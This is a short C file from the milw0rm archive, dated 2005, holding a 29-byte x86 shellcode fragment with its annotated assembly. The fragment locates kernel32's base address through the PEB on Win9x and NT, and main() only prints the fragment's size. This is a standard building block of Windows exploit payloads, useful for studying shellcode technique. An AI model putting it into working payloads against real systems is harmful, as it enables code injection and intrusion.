//
// PEB way of getting kernel32 imagebase by loco.
// Compatible with all Win9x/NT based operating systems.
//
// Gives kernel32 imagebase in eax when executing.
// 29 bytes, only eax/esi used.
//
// Originally discovered by Dino Dai Zovi.
//
//

#include <stdio.h>

/*
	xor   eax, eax
	add   eax, fs:[eax+30h]
	js    method_9x

method_nt:
	mov   eax, [eax + 0ch]
	mov   esi, [eax + 1ch]
	lodsd
	mov   eax, [eax + 08h]
	jmp   kernel32_ptr_found

method_9x:
	mov   eax, [eax + 34h]
	lea   eax, [eax + 7ch]
	mov   eax, [eax + 3ch]
kernel32_ptr_found:
*/

unsigned char Shellcode[] =
	"\x33\xC0"          // xor eax, eax
	"\x64\x03\x40\x30"  // add eax, dword ptr fs:[eax+30]
	"\x78\x0C"          // js short $+12
	"\x8B\x40\x0C"      // mov eax, dword ptr [eax+0C]
	"\x8B\x70\x1C"      // mov esi, dword ptr [eax+1C]
	"\xAD"              // lodsd
	"\x8B\x40\x08"      // mov eax, dword ptr [eax+08]
	"\xEB\x09"          // jmp short $+9
	"\x8B\x40\x34"      // mov eax, dword ptr [eax+34]
	"\x8D\x40\x7C"      // lea eax, dword ptr [eax+7C]
	"\x8B\x40\x3C"      // mov eax, dword ptr [eax+3C]
; // = 29 bytes.

int main()
{
	printf("Shellcode is %u bytes.\n\n", sizeof(Shellcode)-1);
	return 1;
}

// milw0rm.com [2005-07-26]